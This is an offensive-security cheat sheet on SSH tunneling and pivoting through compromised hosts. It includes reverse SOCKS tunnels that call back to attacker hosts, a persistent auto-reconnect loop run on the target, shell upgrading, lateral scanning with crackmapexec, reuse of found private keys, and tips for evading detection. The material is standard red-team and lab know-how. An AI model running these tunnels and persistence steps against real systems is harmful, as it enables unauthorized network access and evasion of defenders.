# SSH Tunneling - Living Off The Land

**Author:** Julien Bongars\
**Date:** 2025-12-30 00:02:04
**Path:**

---

## SSH Tunnel Types

### Local Port Forward (-L)

**Use Case**: Access a service on the target's network from your machine.

```bash
# Basic syntax
ssh -L [LOCAL_PORT]:[TARGET_HOST]:[TARGET_PORT] [USER]@[PIVOT_HOST]

# Example: Access internal web server
ssh -L 8080:192.168.1.10:80 user@pivot-host

# Run in background with -f -N
ssh -f -N -L 8080:internal-host:80 user@pivot-host

# -f: Background
# -N: No command execution (just tunnel)

# Now browse to: http://localhost:8080
```

### Remote Port Forward (-R) - Reverse Tunnel

**Use Case**: You have a shell on target but want to access services on target's network from your machine. Target connects back to YOU.

```bash
# Basic syntax (run FROM TARGET to connect back to you)
ssh -R [ATTACKER_PORT]:TARGET_SERVICE:[TARGET_PORT] -p [DO_NOT_USE_PORT_22] [USER]@[ATTACKER_IP]

# Example: From compromised target, expose internal service to attacker
ssh -R 8080:192.168.1.10:80 -p 443 kali@attacker-ip

# Now on your attacker machine: http://localhost:8080 reaches 192.168.1.10:80
```

### Dynamic Port Forward (-D) - SOCKS Proxy

**Use Case**: Route all traffic through target (scan entire network, use any tool).

```bash
# Basic syntax
ssh -D [LOCAL_PORT] [USER]@[PIVOT_HOST]

# Example: Create SOCKS proxy on port 1080
ssh -D 1080 user@pivot-host

# Configure proxychains to use localhost:1080
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains crackmapexec smb 192.168.1.0/24
proxychains curl http://192.168.1.50
```

## Tunneling

### Double Pivot

```bash
# First pivot
ssh -L 2222:second-pivot:22 user@first-pivot

# Second pivot (through first)
ssh -L 8080:final-target:80 -p 2222 user@localhost

# Access final target
curl http://localhost:8080
```

### ProxyJump (Cleaner Double Pivot)

```bash
# Modern SSH supports ProxyJump
ssh -F path/to/ssh/config.conf -J user1@pivot1,user2@pivot2 user3@final-target

# Or in ~/.ssh/config
Host final
    HostName final-target
    User user3
    ProxyJump user1@pivot1,user2@pivot2
```

### SSH Config File Method

```bash
# Edit ~/.ssh/config
Host pivot
    HostName 10.10.10.50
    User compromised-user
    LocalForward 8080 192.168.1.10:80
    LocalForward 3389 192.168.1.20:3389
    DynamicForward 1080

# Now just run, use -F to specify config
ssh -F path/to/the/ssh/config.conf pivot
```

### Reverse SOCKS Tunnel (Post-Exploitation)

```bash
# Critical for post-exploitation when you have RCE
# Requires GatewayPorts yes in /etc/ssh/sshd_config on attacker machine

# SETUP: On attacker machine first
sudo vim /etc/ssh/sshd_config

# Add: 
# GatewayPorts yes
# Port 443

sudo systemctl restart ssh

# From compromised target (connects back to you)
ssh -R 1080 -p 443 kali@attacker-ip

# On attacker - now you can explore target's entire network
proxychains nmap -sT -Pn --top-ports 1000 192.168.1.0/24
proxychains nmap -sT -Pn -p- 192.168.1.50
proxychains curl http://192.168.1.10
proxychains crackmapexec smb 192.168.1.0/24

# Persist the connection
ssh -R 1080 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 kali@attacker-ip

# Or run in background on target
nohup ssh -R 1080 -o ServerAliveInterval=60 kali@attacker-ip &
```

## Troubleshooting

### Keep Alive (Prevent Timeout)

```bash
# Add keep-alive options (critical for unstable connections)
ssh -o ServerAliveInterval=60 -o ServerAliveCountMax=3 -D 1080 user@pivot

# ServerAliveInterval: Send keepalive every 60 seconds
# ServerAliveCountMax: Try 3 times before giving up

# For reverse tunnels (post-exploitation)
ssh -R 1080 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 kali@attacker

# Or in ~/.ssh/config (applies to all connections)
Host *
    ServerAliveInterval 60
    ServerAliveCountMax 3
    TCPKeepAlive yes
```

### Compression (Slow Links)

```bash
# Enable compression
ssh -C -D 1080 user@pivot
```

## SSH Without Password

### Using SSH Keys

```bash
# Generate key pair (if needed)
ssh-keygen -t ed25519

# Copy to target (if you have creds)
ssh-copy-id user@pivot-host

# Or manually
cat ~/.ssh/id_ed25519.pub | ssh user@pivot "cat >> ~/.ssh/authorized_keys"

# Now connect without password
ssh -D 1080 user@pivot-host
```

### Using Compromised Private Key

```bash
# Found id_rsa on compromised host
chmod 600 id_rsa

# Use it
ssh -i id_rsa -D 1080 user@next-target
```

## Windows SSH (Windows 10+)

### Check if SSH Client Available

```powershell
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH.Client*'
```

### Windows SSH Tunnel

```powershell
# Same syntax as Linux

# Background (using PowerShell Start-Process)
Start-Process ssh -ArgumentList "-D 1080 user@pivot-host" -WindowStyle Hidden
```

## Proxychains Configuration

### Edit /etc/proxychains4.conf

```bash
# Comment out existing proxy
# Add your SOCKS5 proxy
socks5 127.0.0.1 1080

# Or use proxychains-ng with command line
proxychains4 -f /path/to/custom.conf nmap -sT 192.168.1.0/24
```

### Proxychains Tips

```bash
# Use TCP connect scan (-sT) with proxychains, not SYN scan
proxychains nmap -sT -Pn 192.168.1.10

# Scan common ports quickly
proxychains nmap -sT -Pn --top-ports 1000 192.168.1.0/24

# Full port scan (slower through SOCKS)
proxychains nmap -sT -Pn -p- 192.168.1.50

# Some tools work better than others
proxychains curl http://192.168.1.10
proxychains crackmapexec smb 192.168.1.0/24
proxychains psql -h 192.168.1.50 -p 5432

# Tools that don't work well with proxychains
# - ping (ICMP doesn't work through SOCKS)
# - nmap SYN scan (needs raw sockets)
# - traceroute (ICMP/UDP issues)
```

## Post-Exploitation Workflow

### Scenario: Got RCE, Need Persistent Access

```bash
# ===== YOU: Attacker at 10.10.14.5 =====
# THEM: Compromised target at 192.168.10.50
# PROBLEM: Unstable nc shell from complex exploit

# STEP 1: Prepare your attacker machine
sudo systemctl start ssh
sudo vim /etc/ssh/sshd_config
# Ensure: GatewayPorts yes
# Ensure: PasswordAuthentication yes (or setup key)
sudo systemctl restart ssh

# STEP 2: From target's nc shell - upgrade and tunnel back
python3 -c 'import pty;pty.spawn("/bin/bash")'
ssh -R 1080 -o ServerAliveInterval=60 kali@10.10.14.5
# Keep this session alive!

# STEP 3: On attacker - explore target's network
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -Pn --top-ports 1000 192.168.10.0/24

# STEP 4: Access discovered services
proxychains psql -h 192.168.10.23 -p 5432
proxychains xfreerdp /v:192.168.10.100:3389
proxychains crackmapexec smb 192.168.10.0/24

# STEP 5: Add specific reverse forwards as needed
# From target (in another session or terminate and restart)
ssh -R 5432:192.168.10.23:5432 -R 3389:192.168.10.100:3389 kali@10.10.14.5

# On attacker - direct access without proxychains
psql -h localhost -p 5432
xfreerdp /v:localhost:3389
```

### Pro Tips for Maintaining Access

```bash
# Persist SSH reverse tunnel on target
nohup ssh -R 1080 -o ServerAliveInterval=60 -o ServerAliveCountMax=3 kali@attacker &

# Or use screen/tmux to keep session alive
screen -dmS tunnel ssh -R 1080 kali@attacker

# Auto-reconnect script (on target)
while true; do
  ssh -R 1080 -o ServerAliveInterval=60 kali@attacker
  sleep 10
done &

# Monitor tunnel on attacker
netstat -tlnp | grep 1080
# Should show: 127.0.0.1:1080 LISTEN

# If tunnel dies, check attacker's SSH logs
sudo tail -f /var/log/auth.log
```

### Combine Forward and Reverse Tunnels

```bash
# Scenario: Unstable shell, want to explore AND upgrade

# Step 1: From target, reverse SOCKS to discover
ssh -R 1080 kali@attacker

# Step 2: Use reverse SOCKS to scan
proxychains nmap -sT --top-ports 1000 192.168.10.0/24

# Step 3: Found SSH on target? Use it for stable access
proxychains ssh -L 5432:postgres.internal:5432 admin@192.168.10.50

# Now you have:
# - Reverse tunnel for discovery (via target's unstable shell)
# - Forward tunnel for specific access (via stable SSH to target)
```

### Using Built-in Tools

#### Netsh (Windows)

```cmd
# Port forwarding on Windows (requires admin)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.1.10

# View rules
netsh interface portproxy show all

# Delete rule
netsh interface portproxy delete v4tov4 listenport=8080
```

#### Socat (If Available)

```bash
# Check if socat installed
which socat

# Port forward
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80

# Background
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80 &
```

#### Iptables (Linux with root)

```bash
# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Forward port
iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 192.168.1.10:80
iptables -t nat -A POSTROUTING -j MASQUERADE
```

### SSH Alternatives (Stealthy)

#### Using RDP for Tunneling

```bash
# If RDP available, can tunnel through it
xfreerdp /v:target /u:user /p:pass /drive:share,/tmp

# Then use SMB or other services through RDP
```

#### Windows Remote Management (WinRM)

```powershell
# If WinRM available (port 5985/5986)
# Can use for remote code execution
Enter-PSSession -ComputerName target -Credential (Get-Credential)
```

## Alternative LOTL Tools

### Using Built-in Tools

### Why SSH Tunneling is Stealthy

1. **No binary drops** - Uses pre-installed tools
2. **Legitimate traffic** - SSH is expected in enterprises
3. **Encrypted** - Traffic inspection won't see payloads
4. **Common ports** - Port 22 rarely blocked
5. **No persistence** - Tunnel dies when session ends

### Detection Points

- SSH connections to unusual hosts
- SSH connections from unusual users
- Long-duration SSH sessions
- High bandwidth SSH connections
- SSH connections at unusual times

### Evasion Tips

```bash
# Use non-standard SSH port (if available)
ssh -p 2222 -D 1080 user@pivot

# Limit connection time (disconnect and reconnect)
timeout 30m ssh -D 1080 user@pivot

# Use legitimate-looking account names
ssh -D 1080 admin@pivot  # Better than
ssh -D 1080 hacker123@pivot  # This

# Blend in with normal SSH traffic patterns
```

## Quick Reference

### Most Common Commands

```bash
# SOCKS proxy (most versatile)
ssh -D 1080 user@pivot

# Single port forward
ssh -L 8080:internal-host:80 user@pivot

# Multiple ports
ssh -L 8080:web:80 -L 3389:dc:3389 user@pivot

# Background tunnel
ssh -f -N -D 1080 user@pivot

# With proxychains
proxychains nmap -sT 192.168.1.0/24
```

### When to Use SSH vs Chisel

**Use SSH when**:

- ✅ SSH is already installed on target
- ✅ Stealth is priority
- ✅ You have SSH credentials or keys
- ✅ SSH traffic is normal in environment

**Use Chisel when**:

- ✅ No SSH available (Windows servers)
- ✅ Don't have SSH credentials
- ✅ Need HTTP-based tunnel (firewall bypass)
- ✅ Simpler syntax preferred
- ✅ Stealth is not critical

## Troubleshooting

### Connection Refused

```bash
# Check if SSH running on pivot
nmap -p 22 pivot-host

# Try verbose mode
ssh -v -D 1080 user@pivot
```

### Permission Denied

```bash
# Check credentials
ssh user@pivot  # Test basic connection first

# Try different authentication
ssh -o PreferredAuthentications=password -D 1080 user@pivot
```

### GatewayPorts Error

```bash
# If remote forward fails, check sshd_config on remote
# Need: GatewayPorts yes

# Workaround: only bind to localhost
ssh -R 8080:localhost:80 user@pivot
```

### Proxychains Not Working

```bash
# Verify SOCKS proxy is running
netstat -tulpn | grep 1080

# Test with curl first
proxychains curl http://192.168.1.10

# Use verbose mode
proxychains4 -v nmap -sT 192.168.1.10
```

## Additional Resources

**Proxychains** https://github.com/haad/proxychains
